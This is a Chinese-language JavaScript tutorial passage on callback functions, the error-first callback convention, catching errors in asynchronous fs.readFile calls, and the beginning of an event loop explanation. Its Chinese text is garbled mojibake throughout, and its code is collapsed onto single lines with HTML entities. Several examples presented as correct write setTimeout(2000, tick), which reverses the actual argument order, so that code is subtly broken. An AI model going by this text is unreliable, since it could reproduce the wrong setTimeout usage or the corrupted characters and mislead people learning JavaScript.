const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick() &#123;  alert(&#x27;click!&#x27;)&#125;

ã€Œç•¶æŸäº‹ï¼ˆæœ‰äººé»æ“Š .btn_alert é€™å€‹æŒ‰éˆ•ï¼‰ç™¼ç”Ÿæ™‚ï¼Œè«‹åˆ©ç”¨é€™å€‹ functionï¼ˆhandleClickï¼‰é€šçŸ¥æˆ‘ã€ï¼ŒhandleClickä¸å°±æ˜¯å€‹ callback function å—ï¼Ÿ
åˆæˆ–è€…æ˜¯ï¼š
window.onload = function() &#123;  alert(&#x27;load!&#x27;)&#125;

ã€Œç•¶æŸäº‹ï¼ˆç¶²é è¼‰å…¥å®Œæˆï¼‰ç™¼ç”Ÿæ™‚ï¼Œè«‹åˆ©ç”¨é€™å€‹ functionï¼ˆåŒ¿åå‡½å¼ï¼‰é€šçŸ¥æˆ‘ã€ï¼Œé€™ä¸ä¹Ÿæ˜¯ callback function å—ï¼Ÿ
å†èˆ‰æœ€å¾Œä¸€å€‹ç¯„ä¾‹ï¼š
setTimeout(2000, tick)function tick() &#123;  alert(&#x27;æ™‚é–“åˆ°ï¼&#x27;)&#125;

ã€Œç•¶æŸäº‹ï¼ˆéäº†å…©ç§’ï¼‰ç™¼ç”Ÿæ™‚ï¼Œè«‹åˆ©ç”¨é€™å€‹ functionï¼ˆtickï¼‰é€šçŸ¥æˆ‘ã€ï¼Œé€™éƒ½æ˜¯ä¸€æ¨£çš„æ¨¡å¼ã€‚
åœ¨ä½¿ç”¨ callback function æ™‚ï¼Œæœ‰ä¸€å€‹åˆå­¸è€…å¾ˆå¸¸çŠ¯çš„éŒ¯èª¤ä¸€å®šè¦ç‰¹åˆ¥æ³¨æ„ã€‚éƒ½èªªäº†å‚³é€²å»çš„åƒæ•¸æ˜¯ callback functionï¼Œæ˜¯ä¸€å€‹ã€Œfunctionã€ï¼Œä¸æ˜¯ function åŸ·è¡Œå¾Œçš„çµæœï¼ˆé™¤éä½ çš„ function åŸ·è¡Œå®Œæœƒå›å‚³ functionï¼Œé€™å°±å¦ç•¶åˆ¥è«–ï¼‰ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œæ¨™æº–éŒ¯èª¤ç¯„ä¾‹æœƒé•·å¾—åƒé€™æ¨£ï¼š
setTimeout(2000, tick())function tick() &#123;  alert(&#x27;æ™‚é–“åˆ°ï¼&#x27;)&#125;  // æˆ–è€…æ˜¯é€™æ¨£window.onload = load()function load() &#123;  alert(&#x27;load!&#x27;)&#125;

tickæ˜¯ä¸€å€‹ functionï¼Œtick()å‰‡æ˜¯åŸ·è¡Œä¸€å€‹ functionï¼Œä¸¦ä¸”æŠŠåŸ·è¡Œå®Œçš„å›å‚³çµæœç•¶ä½œ callback functionï¼Œç°¡å–®ä¾†è¬›å°±æ˜¯é€™æ¨£ï¼š
// éŒ¯èª¤ç¯„ä¾‹setTimeout(2000, tick())function tick() &#123;  alert(&#x27;æ™‚é–“åˆ°ï¼&#x27;)&#125;  // ä¸Šé¢çš„éŒ¯èª¤ç¯„ä¾‹ç­‰åŒæ–¼let fn = tick()setTimeout(2000, fn)function tick() &#123;  alert(&#x27;æ™‚é–“åˆ°ï¼&#x27;)&#125;

ç”±æ–¼ tick åŸ·è¡Œå¾Œæœƒå›å‚³ undefinedï¼Œæ‰€ä»¥ setTimeout é‚£è¡Œå¯ä»¥çœ‹æˆï¼šsetTimeout(2000, undefined)ï¼Œä¸€é»ä½œç”¨éƒ½æ²’æœ‰ã€‚
æŠŠ function èª¤å¯«æˆ function call ä»¥å¾Œï¼Œæœƒç”¢ç”Ÿçš„çµæœå°±æ˜¯ï¼Œç•«é¢é‚„æ˜¯è·³å‡ºã€Œæ™‚é–“åˆ°ï¼ã€ä¸‰å€‹å­—ï¼Œå¯æ˜¯å…©ç§’é‚„æ²’éå®Œã€‚å› ç‚ºé€™æ¨£å¯«å°±ç­‰æ–¼æ˜¯ä½ å…ˆåŸ·è¡Œäº† tick é€™å€‹ functionã€‚
window.onload çš„ä¾‹å­ä¹Ÿæ˜¯ä¸€æ¨£ï¼Œå¯ä»¥çœ‹æˆæ˜¯é€™æ¨£ï¼š
// éŒ¯èª¤ç¯„ä¾‹window.onload = load()function load() &#123;  alert(&#x27;load!&#x27;)&#125;  // ä¸Šé¢çš„éŒ¯èª¤ç¯„ä¾‹ç­‰åŒæ–¼let fn = load()window.onload = fn

æ‰€ä»¥ç¶²é é‚„æ²’è¼‰å…¥å®Œæˆæ™‚å°±æœƒåŸ·è¡Œ load é€™å€‹ function äº†ã€‚
å†æ¬¡é‡ç”³ï¼Œtick æ˜¯ functionï¼Œtick()æ˜¯åŸ·è¡Œ functionï¼Œé€™å…©å€‹çš„æ„æ€å®Œå…¨ä¸ä¸€æ¨£ã€‚
å¹«å¤§å®¶é‡é»è¤‡ç¿’ï¼š

ç€è¦½å™¨è£¡åŸ·è¡Œ JavaScript çš„ main thread åŒæ™‚ä¹Ÿè² è²¬ç•«é¢çš„ renderï¼Œå› æ­¤éåŒæ­¥é¡¯å¾—æ›´åŠ é‡è¦è€Œä¸”å¿…é ˆï¼Œå¦å‰‡ç­‰å¾…çš„æ™‚å€™ç•«é¢æœƒå‡çµ
callback function çš„æ„æ€å…¶å¯¦å°±æ˜¯ï¼šã€Œç•¶æŸäº‹ç™¼ç”Ÿçš„æ™‚å€™ï¼Œè«‹åˆ©ç”¨é€™å€‹ function é€šçŸ¥æˆ‘ã€
fn æ˜¯ä¸€å€‹ functionï¼Œfn() æ˜¯åŸ·è¡Œ function

Callback function çš„åƒæ•¸å‰é¢æœ‰æåˆ°èªª callback function çš„åƒæ•¸éœ€è¦çœ‹æ–‡ä»¶æ‰èƒ½çŸ¥é“ï¼Œæˆ‘å€‘èˆ‰åº•ä¸‹é€™å€‹é»æ“ŠæŒ‰éˆ•ç‚ºä¾‹ï¼š
const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick() &#123;  alert(&#x27;click!&#x27;)&#125;

å¾ MDN çš„æ–‡ä»¶ä¸Šï¼Œä½ å¯ä»¥çœ‹åˆ°å®ƒæ˜¯é€™æ¨£å¯«çš„ï¼š

ä¸€å€‹å«åš event çš„ object æœƒè¢«å‚³é€²å»ï¼Œè€Œé€™å€‹ object æ˜¯åœ¨æè¿°é€™å€‹ç™¼ç”Ÿçš„äº‹ä»¶ã€‚è½èµ·ä¾†å¾ˆæŠ½è±¡ï¼Œä½†æˆ‘å€‘å¯ä»¥å¯¦éš›ä¾†å¯¦é©—çœ‹çœ‹ï¼š
const btn = document.querySelector(&#x27;.btn_alert&#x27;)btn.addEventListener(&#x27;click&#x27;, handleClick)  function handleClick(e) &#123;  console.log(e)&#125;

ç•¶æˆ‘å€‘é»æ“Šé€™å€‹æŒ‰éˆ•ä¹‹å¾Œï¼Œå¯ä»¥çœ‹åˆ° console å°å‡ºäº†ä¸€å€‹æœ‰è¶…ç´šå¤šå±¬æ€§çš„ç‰©ä»¶ï¼š

ä»”ç´°çœ‹ä½ æœƒç™¼ç¾é€™å€‹ç‰©ä»¶å…¶å¯¦å°±æ˜¯åœ¨æè¿°æˆ‘å‰›å‰›çš„ã€Œé»æ“Šã€ï¼Œä¾‹å¦‚èªª clientX èˆ‡ clientY å…¶å¯¦ä»£è¡¨è‘—å‰›å‰›é€™å€‹é»æ“Šçš„åº§æ¨™ã€‚æœ€å¸¸ç”¨çš„ï¼Œä½ ä¸€å®šä¹Ÿè½éçš„å°±æ˜¯e.targetï¼Œå¯ä»¥æ‹¿åˆ°é€™å€‹é»æ“Šäº‹ä»¶ç™¼ç”Ÿçš„ DOM ç‰©ä»¶ã€‚
ä¸éé€™æ™‚æ–°æ‰‹å¯èƒ½æœƒæœ‰å€‹ç–‘å•ï¼šã€Œå‰›å‰›æ–‡ä»¶ä¸Šæ˜æ˜å¯«èªªå‚³é€²ä¾†çš„åƒæ•¸å«åš eventï¼Œç‚ºä»€éº¼ä½ ç”¨ e ä¹Ÿå¯ä»¥ï¼Ÿã€
é€™æ˜¯å› ç‚º function åœ¨å‚³é€ä»¥åŠæ¥æ”¶åƒæ•¸çš„æ™‚å€™ï¼Œæ³¨é‡çš„åªæœ‰ã€Œé †åºã€ï¼Œè€Œä¸æ˜¯æ–‡ä»¶ä¸Šçš„åç¨±ã€‚æ–‡ä»¶ä¸Šçš„åç¨±åªæ˜¯åƒè€ƒç”¨çš„è€Œå·²ï¼Œä¸¦ä¸ä»£è¡¨ä½ å°±ä¸€å®šè¦ç”¨é‚£å€‹åç¨±ä¾†æ¥æ”¶ã€‚function æ²’æœ‰é‚£éº¼æ™ºæ…§ï¼Œä¸æœƒæ ¹æ“šè®Šæ•¸åç¨±ä¾†åˆ¤æ–·æ˜¯å“ªå€‹åƒæ•¸ã€‚
æ‰€ä»¥ä½ çš„ callback function åƒæ•¸åç¨±æƒ³è¦æ€éº¼å–éƒ½å¯ä»¥ï¼ŒhandleClick(e)ã€handleClick(evt)ã€handleClick(event) æˆ–æ˜¯ handleClick(yoooooo)éƒ½å¯ä»¥ï¼Œéƒ½å¯ä»¥æ‹¿åˆ°ç€è¦½å™¨æ‰€å‚³çš„eventé€™å€‹ç‰©ä»¶ï¼Œåªæ˜¯å«åšä¸åŒåç¨±è€Œå·²ã€‚
Callback function æœƒæ¥æ”¶ä»€éº¼åƒæ•¸ï¼Œè¦çœ‹æ–‡ä»¶æ‰æœƒçŸ¥é“ã€‚å¦‚æœæ²’æœ‰æ–‡ä»¶çš„è©±ï¼Œæ²’æœ‰äººçŸ¥é“ callback æœƒè¢«å‚³ä»€éº¼åƒæ•¸é€²ä¾†ã€‚
è©±é›–ç„¶æ˜¯é€™æ¨£è¬›ï¼Œä½†å…¶å¯¦åœ¨å¾ˆå¤šåœ°æ–¹ï¼Œåƒæ•¸éƒ½æœƒéµå¾ªä¸€å€‹æ…£ä¾‹ã€‚
Callback çš„ error first æ…£ä¾‹åŒæ­¥èˆ‡éåŒæ­¥çš„å·®åˆ¥é™¤äº† callback ä»¥å¤–é‚„æœ‰ä¸€å€‹ï¼Œé‚£å°±æ˜¯éŒ¯èª¤è™•ç†ã€‚
å›åˆ°æˆ‘å€‘é–‹é ­èˆ‰çš„é‚£å€‹åŒæ­¥è®€å–æª”æ¡ˆçš„ç¯„ä¾‹ï¼š
const fs = require(&#x27;fs&#x27;) // å¼•å…¥å…§å»º file system æ¨¡çµ„const file = fs.readFileSync(&#x27;./README.md&#x27;) // è®€å–æª”æ¡ˆconsole.log(file) // å°å‡ºå…§å®¹

å¦‚æœä»Šå¤© ./README.md é€™å€‹æª”æ¡ˆä¸å­˜åœ¨ï¼ŒåŸ·è¡Œä¹‹å¾Œå°±æœƒåœ¨ console å°å‡ºéŒ¯èª¤è¨Šæ¯ï¼š
fs.js:115    throw err;    ^  Error: ENOENT: no such file or directory, open &#x27;./README.md&#x27;    at Object.openSync (fs.js:436:3)    at Object.readFileSync (fs.js:341:35)

è¦è™•ç†é€™ç¨®éŒ¯èª¤ï¼Œå¯ä»¥ç”¨ try...catch çš„èªæ³•å»åŒ…ä½ï¼š
const fs = require(&#x27;fs&#x27;) // å¼•å…¥å…§å»º file system æ¨¡çµ„  try &#123;  const file = fs.readFileSync(&#x27;./README.md&#x27;) // è®€å–æª”æ¡ˆ  console.log(file) // å°å‡ºå…§å®¹&#125; catch(err) &#123;  console.log(&#x27;è®€æª”å¤±æ•—&#x27;)&#125;

ç•¶æˆ‘å€‘ç”¨ try...catch åŒ…ä½ä»¥å¾Œï¼Œå°±èƒ½å¤ é‡å°éŒ¯èª¤é€²è¡Œè™•ç†ï¼Œä»¥ä¸Šé¢çš„ä¾‹å­ä¾†èªªï¼Œå°±æœƒè¼¸å‡ºã€Œè®€æª”å¤±æ•—ã€é€™å››å€‹å­—ã€‚
å¯æ˜¯å¦‚æœæ›æˆéåŒæ­¥çš„ç‰ˆæœ¬ï¼Œäº‹æƒ…å°±æœ‰é»ä¸å¤ªä¸€æ¨£äº†ï¼Œè«‹å…ˆçœ‹åº•ä¸‹çš„ç¯„ä¾‹ç¨‹å¼ç¢¼ï¼š
const fs = require(&#x27;fs&#x27;) // å¼•å…¥å…§å»º file system æ¨¡çµ„  try &#123;  // è®€å–æª”æ¡ˆ  fs.readFile(&#x27;./README.md&#x27;, (err, data) =&gt; &#123;    console.log(data) // å°å‡ºå…§å®¹  &#125;)&#125; catch(err) &#123;  console.log(&#x27;è®€æª”å¤±æ•—&#x27;)&#125;

åŸ·è¡Œä»¥å¾Œï¼Œconsole å±…ç„¶æ²’æœ‰ä»»ä½•åæ‡‰ï¼æ˜æ˜ç™¼ç”Ÿäº†éŒ¯èª¤ï¼Œå¯æ˜¯å»æ²’æœ‰è¢« catch åˆ°ï¼Œé€™æ˜¯ç‚ºä»€éº¼å‘¢ï¼Ÿ
é€™å°±æ˜¯åŒæ­¥èˆ‡éåŒæ­¥å¦ä¸€å€‹å·¨å¤§çš„å·®ç•°ã€‚
åœ¨åŒæ­¥çš„ç‰ˆæœ¬ç•¶ä¸­ï¼Œæˆ‘å€‘æœƒç­‰å¾…æª”æ¡ˆè®€å–å®Œç•¢æ‰åŸ·è¡Œä¸‹ä¸€è¡Œï¼Œæ‰€ä»¥è®€å–æª”æ¡ˆçš„æ™‚å€™å‡ºäº†ä»€éº¼éŒ¯ï¼Œå°±æœƒæŠŠéŒ¯èª¤æ‹‹å‡ºä¾†ï¼Œæˆ‘å€‘å°±å¯ä»¥ tryâ€¦catch å»è™•ç†ã€‚
ä½†æ˜¯åœ¨éåŒæ­¥çš„ç‰ˆæœ¬ä¸­ï¼Œfs.readFileé€™å€‹ function åªåšäº†ä¸€ä»¶äº‹ï¼Œå°±æ˜¯è·Ÿ Node.js èªªï¼šã€Œå»è®€å–æª”æ¡ˆï¼Œè®€å–å®Œä¹‹å¾Œå‘¼å« callback functionã€ï¼Œåšå®Œé€™ä»¶äº‹æƒ…ä¹‹å¾Œå°±ç¹¼çºŒåŸ·è¡Œä¸‹ä¸€è¡Œäº†ã€‚
æ‰€ä»¥è®€å–æª”æ¡ˆé‚£ä¸€é ­ç™¼ç”Ÿäº†ä»€éº¼äº‹ï¼Œæˆ‘å€‘æ˜¯å®Œå…¨ä¸çŸ¥é“çš„ã€‚
èˆ‰å€‹ä¾‹å­ï¼Œé€™å°±å¥½åƒæ˜¯é¤å»³çš„å…§å¤–å ´ï¼Œå‡è¨­æˆ‘è² è²¬å¤–å ´ï¼Œæœ‰äººé»äº†ä¸€ç¢—ç‰›è‚‰éºµï¼Œæˆ‘å°±æœƒæœå»šæˆ¿å¤§å–Šï¼šã€Œä¸€ç¢—ç‰›è‚‰éºµï¼ã€ï¼Œå°±ç¹¼çºŒæœå‹™ä¸‹ä¸€å€‹å®¢æˆ¶äº†ã€‚å–Šå®Œä¹‹å¾Œå…§å ´æœ‰æ²’æœ‰çœŸçš„é–‹å§‹åšç‰›è‚‰éºµï¼Ÿæˆ‘ä¸çŸ¥é“ï¼Œä½†æ‡‰è©²è¦æœ‰ã€‚å…§å ´å¦‚æœç‰›è‚‰è³£å®Œäº†åšä¸å‡ºä¾†ï¼Œæˆ‘å–Šçš„ç•¶ä¸‹ä¹Ÿæ˜¯ä¸æœƒçŸ¥é“çš„ã€‚
é‚£æˆ‘è¦æ€éº¼çŸ¥é“ï¼Ÿ
å‡è¨­ç‰›è‚‰çœŸçš„è³£å®Œäº†ï¼Œå…§å ´æœƒä¸»å‹•ä¾†è·Ÿæˆ‘èªªå˜›ï¼Œé€™æ™‚å€™æˆ‘æ‰æœƒçŸ¥é“ç‰›è‚‰è³£å®Œäº†ã€‚
é€™å°±å¥½åƒéåŒæ­¥çš„ç¯„ä¾‹ä¸€æ¨£ï¼Œé‚£ä¸€è¡Œåªè² è²¬å‘Šè¨´ç³»çµ±ã€Œå»è®€æª”ã€ï¼Œå‰©ä¸‹çš„ä¸ç”˜å®ƒçš„äº‹ï¼Œå¦‚æœç™¼ç”Ÿä»€éº¼äº‹ï¼Œå¿…é ˆä¸»å‹•å‘Šè¨´å®ƒï¼Œè¦ç”¨ callback çš„æ–¹å¼ä¾†å‚³éã€‚
æˆ‘å€‘å†è¤‡ç¿’ä¸€æ¬¡é–‹é ­æéçš„ Node.js çš„ readFile çš„æ–‡ä»¶ï¼š

callback æœƒæœ‰å…©å€‹åƒæ•¸ï¼Œç¬¬ä¸€å€‹æ˜¯ errï¼Œç¬¬äºŒå€‹æ˜¯ dataï¼Œé€™æ¨£ä½ å°±çŸ¥é“ err æ˜¯æ€éº¼ä¾†çš„äº†ã€‚åªè¦åœ¨è®€æª”çš„æ™‚å€™ç¢°åˆ°ä»»ä½•éŒ¯èª¤ï¼Œä¾‹å¦‚èªªæª”æ¡ˆä¸å­˜åœ¨ã€æª”æ¡ˆè¶…éè¨˜æ†¶é«”å¤§å°æˆ–æ˜¯æª”æ¡ˆæ²’æœ‰æ¬Šé™é–‹å•Ÿç­‰ç­‰ï¼Œéƒ½æœƒé€éé€™å€‹ err åƒæ•¸å‚³é€²ä¾†ï¼Œé€™å€‹éŒ¯èª¤ä½ ç”¨ tryâ€¦catch æ˜¯æŠ“ä¸åˆ°çš„ã€‚
æ‰€ä»¥ï¼Œç•¶æˆ‘å€‘éåŒæ­¥åœ°åŸ·è¡ŒæŸä»¶äº‹æƒ…çš„æ™‚å€™ï¼Œæœ‰å…©é»æˆ‘å€‘ä¸€å®šæœƒæƒ³çŸ¥é“ï¼š

æœ‰æ²’æœ‰ç™¼ç”ŸéŒ¯èª¤ï¼Œæœ‰çš„è©±éŒ¯èª¤æ˜¯ä»€éº¼
é€™ä»¶äº‹æƒ…çš„å›å‚³å€¼

èˆ‰ä¾‹ä¾†èªªï¼Œè®€å–æª”æ¡ˆæˆ‘å€‘æœƒæƒ³çŸ¥é“æœ‰æ²’æœ‰éŒ¯èª¤ï¼Œä¹Ÿæƒ³çŸ¥é“æª”æ¡ˆå…§å®¹ã€‚æˆ–æ˜¯æ“ä½œè³‡æ–™åº«ï¼Œæˆ‘å€‘æœƒæƒ³çŸ¥é“æŒ‡ä»¤æœ‰æ²’æœ‰ä¸‹éŒ¯ï¼Œä¹Ÿæƒ³çŸ¥é“å›å‚³çš„è³‡æ–™æ˜¯ä»€éº¼ã€‚
æ—¢ç„¶éåŒæ­¥ä¸€å®šæœƒæƒ³çŸ¥é“é€™å…©ä»¶äº‹ï¼Œé‚£å°±ä»£è¡¨è‡³å°‘æœƒæœ‰å…©å€‹åƒæ•¸ï¼Œä¸€å€‹æ˜¯éŒ¯èª¤ï¼Œå¦ä¸€å€‹æ˜¯å›å‚³å€¼ã€‚å°æ¨™é¡Œæ‰€èªªçš„ã€Œerror firstã€ï¼Œå°±ä»£è¡¨éŒ¯èª¤ã€Œä¾ç…§æ…£ä¾‹ã€é€šå¸¸æœƒæ”¾åœ¨ç¬¬ä¸€å€‹åƒæ•¸ï¼Œå…¶ä»–å›å‚³å€¼æ”¾ç¬¬äºŒå€‹ä»¥åŠç¬¬äºŒå€‹ä¹‹å¾Œã€‚
ç‚ºä»€éº¼å‘¢ï¼Ÿ
å› ç‚ºéŒ¯èª¤åªæœƒæœ‰ä¸€å€‹ï¼Œä½†å›å‚³å€¼å¯èƒ½æœ‰å¾ˆå¤šå€‹ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œå‡è¨­æœ‰ä¸€å€‹getFileStatsçš„ function æœƒéåŒæ­¥åœ°å»æŠ“å–æª”æ¡ˆç‹€æ…‹ï¼Œä¸¦ä¸”å›å‚³æª”æ¡ˆåç¨±ã€æª”æ¡ˆå¤§å°ã€æª”æ¡ˆæ¬Šé™ä»¥åŠæª”æ¡ˆæ“æœ‰è€…ã€‚å¦‚æœæŠŠ err æ”¾æœ€å¾Œä¸€å€‹åƒæ•¸ï¼Œæˆ‘å€‘çš„ callback å°±æœƒé•·é€™å€‹æ¨£å­ï¼šfunction cb(fileName, fileSize, fileMod, fileOwner, err)
æˆ‘ä¸€å®šè¦æŠŠæ‰€æœ‰åƒæ•¸éƒ½æ˜ç¢ºåœ°å¯«å‡ºä¾†ï¼Œæˆ‘æ‰èƒ½æ‹¿åˆ° errã€‚æ›å¥è©±èªªï¼Œå‡è¨­æˆ‘ä»Šå¤©åªæƒ³è¦æª”æ¡ˆåç¨±è·Ÿæª”æ¡ˆå¤§å°ï¼Œå…¶ä»–çš„æˆ‘ä¸åœ¨æ„ï¼Œè©²æ€éº¼è¾¦ï¼Ÿä¸æ€éº¼è¾¦ï¼Œä¸€æ¨£å¾—å¯«é€™éº¼é•·ï¼Œå› ç‚º err åœ¨æœ€å¾Œä¸€å€‹ã€‚
å¦‚æœæŠŠ err æ“ºå‰é¢çš„è©±ï¼Œæˆ‘å°±åªè¦å¯«ï¼šfunction cb(err, fileName, fileSize) å°±å¥½ï¼Œå¾Œé¢çš„åƒæ•¸æˆ‘ä¸æƒ³æ‹¿çš„è©±ä¸è¦å¯«å°±å¥½ã€‚
é€™å°±æ˜¯ç‚ºä»€éº¼è¦æŠŠ err æ“ºåœ¨æœ€å‰é¢ï¼Œå› ç‚ºæˆ‘å€‘ä¸€å®šæœƒéœ€è¦ errï¼Œä½†ä¸ä¸€å®šéœ€è¦å¾Œé¢æ‰€æœ‰çš„åƒæ•¸ã€‚å› æ­¤ä½ åªè¦çœ‹åˆ°æœ‰ callback functionï¼Œé€šå¸¸ç¬¬ä¸€å€‹åƒæ•¸éƒ½ä»£è¡¨è‘—éŒ¯èª¤è¨Šæ¯ã€‚
æ‰€ä»¥å¾ˆå¸¸æœƒçœ‹åˆ°é€™ç¨®è™•ç†æ–¹å¼ï¼Œå…ˆåˆ¤æ–·æœ‰æ²’æœ‰éŒ¯èª¤å†åšå…¶ä»–äº‹æƒ…ï¼š
const fs = require(&#x27;fs&#x27;)fs.readFile(&#x27;./README.md&#x27;, (err, data) =&gt; &#123;  // å¦‚æœéŒ¯èª¤ç™¼ç”Ÿï¼Œè™•ç†éŒ¯èª¤ç„¶å¾Œè¿”å›ï¼Œå°±ä¸æœƒç¹¼çºŒåŸ·è¡Œä¸‹å»  if (err) &#123;    console.log(err)    return  &#125;  console.log(data)&#125;);

æœ€å¾Œè£œå……ä¸‰é»ï¼Œç¬¬ä¸€é»æ˜¯ error first åªæ˜¯å€‹ã€Œæ…£ä¾‹ã€ï¼Œå¯¦éš›ä¸Šæœƒå‚³ä»€éº¼åƒæ•¸é‚„æ˜¯è¦æ ¹æ“šæ–‡ä»¶è€Œå®šï¼Œä½ ä¹Ÿå¯ä»¥å¯«ä¸€å€‹æŠŠéŒ¯èª¤æ”¾åœ¨æœ€å¾Œä¸€å€‹åƒæ•¸çš„ API å‡ºä¾†ï¼ˆä½†ä½ ä¸æ‡‰è©²é€™æ¨£åšå°±æ˜¯äº†ï¼‰ã€‚
ç¬¬äºŒé»æ˜¯å„˜ç®¡æ˜¯éåŒæ­¥ï¼Œé‚„æ˜¯æœ‰å¯èƒ½åˆ©ç”¨ try catch æŠ“åˆ°éŒ¯èª¤ï¼Œä½†æ˜¯éŒ¯èª¤çš„ã€Œé¡å‹ã€ä¸ä¸€æ¨£ï¼Œä¾‹å¦‚èªªï¼š
const fs = require(&#x27;fs&#x27;)  try &#123;  // è®€å–æª”æ¡ˆ  fs.readFile(&#x27;./README.md&#x27;)&#125; catch(err) &#123;  console.log(&#x27;è®€æª”å¤±æ•—&#x27;)  console.log(err)  // TypeError [ERR_INVALID_CALLBACK]: Callback must be a function&#125;

é€™é‚ŠæŠ“åˆ°çš„éŒ¯èª¤ä¸¦ä¸æ˜¯ã€Œè®€å–æª”æ¡ˆã€æ‰€ç”¢ç”Ÿçš„éŒ¯èª¤ï¼Œè€Œæ˜¯ã€Œå‘¼å«è®€å–æª”æ¡ˆé€™å€‹ fucntionã€æ‰€ç”¢ç”Ÿçš„éŒ¯èª¤ã€‚ä»¥å‰é¢é¤å»³çš„ä¾‹å­ä¾†èªªï¼Œå°±æ˜¯å®¢äººé»é¤çš„æ™‚å€™ä½ å°±çŸ¥é“æ±è¥¿è³£å®Œäº†ï¼Œæ‰€ä»¥ä½ æ ¹æœ¬ä¸å¿…å»å•å…§å ´ï¼Œå°±å¯ä»¥ç›´æ¥è·Ÿå®¢äººèªªï¼šã€Œä¸å¥½æ„æ€æˆ‘å€‘ç‰›è‚‰éºµè³£å®Œå›‰ï¼Œä½ è¦ä¸è¦è€ƒæ…®é»åˆ¥çš„ã€ã€‚
æœ€å¾Œä¸€é»æƒ³è£œå……çš„æ˜¯ï¼Œæœ‰äº›äººå¯èƒ½æœƒå•èªªï¼šã€Œé‚£ç‚ºä»€éº¼ setTimeout æˆ–æ˜¯ event listener é€™äº›æ±è¥¿éƒ½æ²’æœ‰ err é€™å€‹åƒæ•¸ï¼Ÿã€
é‚£æ˜¯å› ç‚ºé€™å¹¾å€‹æ±è¥¿çš„æ‡‰ç”¨å ´åˆä¸å¤ªä¸€æ¨£ã€‚
setTimeout çš„æ„æ€æ˜¯ï¼šã€Œéäº† n ç§’å¾Œï¼Œè«‹å‘¼å«é€™å€‹ functionã€ï¼Œè€Œ event listener çš„æ„æ€æ˜¯ï¼šã€Œç•¶æœ‰äººé»æ“ŠæŒ‰éˆ•ï¼Œè«‹å‘¼å«é€™å€‹ functionã€ã€‚
ã€Œéäº† n ç§’ã€ä»¥åŠã€Œé»æ“ŠæŒ‰éˆ•ã€é€™å…©ä»¶äº‹æƒ…æ˜¯ä¸æœƒç™¼ç”ŸéŒ¯èª¤çš„ã€‚
ä½†åƒæ˜¯ readFile å»è®€å–æª”æ¡ˆï¼Œå°±æœ‰å¯èƒ½åœ¨è®€å–æª”æ¡ˆæ™‚ç™¼ç”ŸéŒ¯èª¤ï¼›è€Œ XMLHttpRequest å‰‡æ˜¯æœ‰å¦å¤–çš„ onerror å¯ä»¥ç”¨ä¾†æ•æ‰éåŒæ­¥æ‰€ç”¢ç”Ÿçš„éŒ¯èª¤ã€‚
ä¸€æ¨£ä¾†æ•´ç†é‡é»ï¼š

callback function çš„åƒæ•¸è·Ÿä¸€èˆ¬ function ä¸€æ¨£ï¼Œæ˜¯çœ‹ã€Œé †åºã€è€Œä¸æ˜¯çœ‹åç¨±ï¼Œæ²’æœ‰é‚£éº¼æ™ºæ…§
ä¾ç…§æ…£ä¾‹ï¼Œé€šå¸¸ callback function çš„ç¬¬ä¸€å€‹åƒæ•¸éƒ½æ˜¯ errï¼Œç”¨ä¾†å‘Šè¨´ä½ æœ‰æ²’æœ‰ç™¼ç”ŸéŒ¯èª¤ï¼ˆæ‰¿ç¬¬ä¸€é»ï¼Œä½ æƒ³å–å« eã€error æˆ–æ˜¯ fxxkingError éƒ½å¯ä»¥ï¼‰
éåŒæ­¥é‚„æ˜¯æœ‰å¯èƒ½ç”¨ try catch æŠ“åˆ°éŒ¯èª¤ï¼Œä½†é‚£æ˜¯ä»£è¡¨ä½ åœ¨ã€Œå‘¼å«éåŒæ­¥å‡½å¼ã€çš„æ™‚å€™å°±ç”¢ç”ŸéŒ¯èª¤

ç†è§£éåŒæ­¥çš„æœ€å¾Œä¸€å¡Šæ‹¼åœ–ï¼šEvent loopå‰é¢è¬›äº†é€™éº¼å¤šéåŒæ­¥çš„æ±è¥¿ï¼Œä½ æœ‰æ²’æœ‰æƒ³ééåŒæ­¥åˆ°åº•æ˜¯æ€éº¼åšçš„ï¼Ÿ
ä¸æ˜¯å¸¸å¸¸è½åˆ¥äººèªª JavaScript æ˜¯ single threadï¼Œåªæœ‰ä¸€å€‹åŸ·è¡Œç·’åœ¨è·‘å—ï¼Ÿå¯æ˜¯å¦‚æœçœŸçš„æ˜¯ single threadï¼Œæ€éº¼å¯èƒ½é”æˆéåŒæ­¥ï¼Ÿ
æƒ³è¦ç†è§£éåŒæ­¥æ“ä½œåˆ°åº•æ€éº¼é”æˆçš„ï¼Œæˆ‘å”¯ä¸€æ¨è–¦é€™å€‹å½±ç‰‡ï¼šWhat the heck is the event loop anyway? | Philip Roberts | JSConf EUï¼Œæ¯å€‹çœ‹éçš„äººéƒ½è®šä¸çµ•å£ã€‚
åªè¦ä½ çœ‹äº†é€™å€‹å½±ç‰‡ï¼Œå°±æœƒçŸ¥é“éåŒæ­¥èƒŒå¾Œæ˜¯æ€éº¼ä¸€å›äº‹äº†ã€‚å› ç‚ºé€™å½±ç‰‡å¯¦åœ¨æ˜¯è¬›å¾—å¤ªå¥½äº†ï¼Œå› æ­¤æˆ‘åº•ä¸‹åªæœƒå¹«å¤§å®¶é‡é»è¤‡ç¿’ä¸€ä¸‹ï¼Œè«‹çœ‹å®Œå½±ç‰‡å†å¾€ä¸‹é–±è®€ï¼Œå¦‚æœä½ é‚„æ²’çœ‹çš„è©±â€¦çœ‹ä¸€ä¸‹å•¦ï¼Œæ‹œè¨—ã€‚
åœ¨ç¨‹å¼çš„åŸ·è¡Œè£¡é¢ï¼Œæœƒæœ‰ä¸€å€‹æ±è¥¿å«åš call stackï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯ç´€éŒ„è‘—æ¯å€‹ function åŸ·è¡Œæ™‚éœ€è¦ç”¨åˆ°çš„è³‡æºï¼Œä»¥åŠè¨˜éŒ„è‘— function åŸ·è¡Œçš„é †åºã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œè€ƒæ…®ä»¥ä¸‹ç¨‹å¼ç¢¼ï¼š
function a() &#123;  return 1&#125;function b() &#123;  a()&#125;function c() &#123;  b()&#125;c()

